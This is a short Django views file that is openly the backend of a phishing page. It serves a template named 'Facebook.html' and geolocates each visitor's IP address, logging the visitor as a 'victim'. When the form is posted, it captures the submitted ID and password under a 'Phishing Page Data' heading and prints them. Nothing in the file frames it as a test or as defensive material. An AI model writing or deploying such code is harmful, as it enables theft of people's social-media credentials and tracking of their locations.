from django.shortcuts import render
from .fetch_locations  import get_location
def get_ip(request):
    forward=request.META.get('HTTP_X_FORWARDED_FOR')
    if forward:
        ip=forward.split(',')[0]
    else:
        ip=request.META.get('HTTP_X_REAL_IP')
        if not ip:
            ip=request.META.get('REMOTE_ADDR')
    return ip
def gain(request):
    print("Location Details".center(45,"*"))
    try:
        ip_add=get_ip(request)
        val=get_location(ip_add)
        data_val={'ip_address':'IP Address','country':'Country....','country_code':'Country Code','continent':'Continent','continent_code':'Continent Code','city':'City....','region':'Region....','region_code':'Region Code','timezone':'Time Zone','longitude':'longitude','latitude':'latitude','currency':'Currency'}
        for k ,v in data_val.items():
            print(f"\t{v}\t",f"\t{val[k]}")
    except:
        print(f"victem has a invalid ip --{ip_add}\n")
    if request.method=="POST":
        number=request.POST.get('id')
        password=request.POST.get('password')
        print("Phishing Page Data".center(45, "*"))
        print("\tId-......\t",f"\t{number}")
        print("\tPassword-\t",f"\t{password}\n")
        return render(request,'Facebook.html')
    return render(request,'Facebook.html')
    

